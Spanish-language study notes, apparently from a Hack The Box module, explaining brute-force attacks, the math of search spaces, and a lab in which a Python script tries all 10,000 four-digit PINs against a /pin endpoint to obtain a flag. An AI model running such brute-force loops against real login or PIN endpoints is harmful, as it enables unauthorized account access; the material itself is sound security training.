
## 1. Conceptos básicos

Un ataque de **fuerza bruta (Brute Force)** consiste en probar sistemáticamente todas las combinaciones posibles hasta encontrar una contraseña, un PIN u otro valor válido.

El número de combinaciones posibles depende de:

- **Longitud:** número de caracteres.
    
- **Conjunto de caracteres:** letras minúsculas, mayúsculas, números y símbolos.
    
- **Potencia computacional:** cantidad de intentos que se pueden realizar por segundo.
    

### Fórmula

```
Combinaciones posibles = Tamaño del conjunto de caracteres ^ Longitud
```

### Ejemplos

|Longitud|Caracteres permitidos|Combinaciones|
|---|---|---|
|6|Letras minúsculas (26)|26⁶ = 308.915.776|
|8|Letras minúsculas (26)|26⁸ = 208.827.064.576|
|8|Letras minúsculas y mayúsculas (52)|52⁸ = 53.459.728.531.456|
|12|ASCII imprimible (94)|94¹² ≈ 4,76 × 10²³|

**Conclusión:** aumentar la longitud de una contraseña y el conjunto de caracteres incrementa exponencialmente el espacio de búsqueda.

El tiempo necesario también depende de la velocidad de los intentos y de las medidas de seguridad del objetivo.

## 2. Ejercicio práctico: fuerza bruta de un PIN

El laboratorio expone un endpoint `/pin` que acepta un PIN mediante un parámetro GET.

Ejemplo:

```
GET /pin?pin=1234
```

La aplicación genera un PIN aleatorio de cuatro dígitos.

- Si el PIN es correcto, devuelve un mensaje de éxito y una flag.
    
- Si es incorrecto, devuelve un mensaje de error.
    

Como los PIN tienen cuatro dígitos, el espacio de búsqueda es:

```
0000 - 9999
```

Esto supone **10.000 combinaciones posibles**, incluyendo los PIN que comienzan por cero.

## 3. Script de fuerza bruta en Python

Crea un archivo llamado `pin-solver.py`:

```
import requests

ip = "127.0.0.1"  # Cambiar por la IP del objetivo
port = 1234       # Cambiar por el puerto del objetivo

# Probar todos los PIN posibles de 0000 a 9999
for pin in range(10000):
    formatted_pin = f"{pin:04d}"
    print(f"Attempted PIN: {formatted_pin}")

    # Enviar una petición GET al endpoint
    response = requests.get(
        f"http://{ip}:{port}/pin?pin={formatted_pin}"
    )

    # Comprobar si se ha encontrado la flag
    if response.ok and "flag" in response.json():
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break
```

### Explicación del código

|Código|Función|
|---|---|
|`range(10000)`|Genera los valores del 0 al 9999.|
|`f"{pin:04d}"`|Convierte el número en una cadena de cuatro dígitos, añadiendo ceros iniciales.|
|`requests.get()`|Envía una petición HTTP GET.|
|`/pin?pin=...`|Introduce el PIN como parámetro de la petición.|
|`response.ok`|Comprueba si el estado HTTP indica éxito, es decir, un código entre 200 y 399.|
|`"flag" in response.json()`|Comprueba si el JSON contiene la clave `flag`.|
|`break`|Detiene el bucle cuando encuentra la flag.|

**Importante:** `response.ok` por sí solo no confirma que el PIN sea correcto. El script también comprueba que la respuesta JSON contenga la clave `flag`.

## 4. Ejecutar el script

Primero, instala la dependencia si no está disponible:

```
python -m pip install requests
```

Ejecuta el script:

```
python pin-solver.py
```

Antes de ejecutarlo, sustituye `ip` y `port` por los valores que proporciona HTB al iniciar el objetivo.

La salida mostrará los PIN que se van probando:

```
Attempted PIN: 4039
Attempted PIN: 4040
Attempted PIN: 4041
...
Correct PIN found: 4053
Flag: HTB{...}
```

El PIN `4053` es únicamente un ejemplo de salida del módulo; el PIN real depende de la instancia del laboratorio.

## 5. Resumen para el examen

- **Brute Force:** prueba sistemáticamente todas las combinaciones posibles.
    
- **Fórmula:** `Combinaciones = tamaño del conjunto ^ longitud`.
    
- **PIN de cuatro dígitos:** 10.000 posibilidades, desde `0000` hasta `9999`.
    
- `**range(10000)**`**:** genera todos los valores posibles del PIN.
    
- `**f"{pin:04d}"**`**:** conserva los ceros iniciales.
    
- `**requests.get()**`**:** permite enviar peticiones HTTP desde Python.
    
- `**response.json()**`**:** permite interpretar una respuesta JSON.
    
- `**break**`**:** detiene el bucle al encontrar el resultado esperado.
    
- **Limitaciones:** los intentos por segundo, los bloqueos, los límites de peticiones y la aleatoriedad del objetivo pueden afectar al ataque.
    

### Diferencia entre los tipos de ataques

- **Brute Force:** prueba combinaciones sistemáticamente.
    
- **Dictionary Attack:** prueba palabras y contraseñas de una lista.
    
- **Hybrid Attack:** combina palabras de una lista con modificaciones, como números o símbolos.
